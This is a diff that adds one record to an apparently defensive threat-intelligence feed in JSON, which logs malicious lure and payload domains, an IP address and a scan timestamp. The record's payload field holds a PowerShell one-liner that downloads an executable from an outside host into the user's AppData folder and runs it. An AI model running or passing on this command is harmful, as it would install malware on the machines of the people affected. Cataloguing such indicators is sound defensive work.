@@ -1,5 +1,29 @@
 [
   {
+    "UrlDomain": "forexmakesmoney.info",
+    "DeliveryUrl": [
+      "woodland-furniture.com"
+    ],
+    "PayloadUrl": [
+      "https://woodland-furniture.com"
+    ],
+    "IP": [
+      "172.67.153.1"
+    ],
+    "Related": [
+      {
+        "Value": "iture.com",
+        "Type": "Discovered"
+      }
+    ],
+    "Payload": "$p=\"$env:APPDATA\\uni2\\Beautifull.exe\"; New-Item (Split-Path $p) -ItemType Directory -Force | Out-Null; curl.exe -fsL -o \"$p\" \"https://woodland-furniture[.]com\"; if (Test-Path $p) { Start-Process $p }; exit",
+    "ResolvedDownloadUrl": [
+      "https://woodland-furniture.com"
+    ],
+    "ReportId": "cmwyq2eaq0i5q0omljvzkejxo",
+    "ScannedAt": "2026-11-27T08:31:16.530000+00:00"
+  },
+  {
     "UrlDomain": "www.isuzucorluservis.com",
     "DeliveryUrl": [
       "browse-login.info",
